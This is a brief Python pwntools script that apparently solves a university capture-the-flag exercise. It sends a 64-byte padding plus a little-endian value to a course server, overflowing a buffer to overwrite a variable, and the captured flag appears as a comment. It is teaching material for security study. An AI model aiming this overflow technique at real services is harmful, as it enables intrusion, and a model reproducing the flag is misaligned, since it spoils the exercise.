# SSof{Buffer_Overflow_can_change_values_to_wh4t_you_want}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22152

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### interact with it
# 0x61626364
msg = b'A'*64+b'\x64\x63\x62\x61'
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

s.interactive()

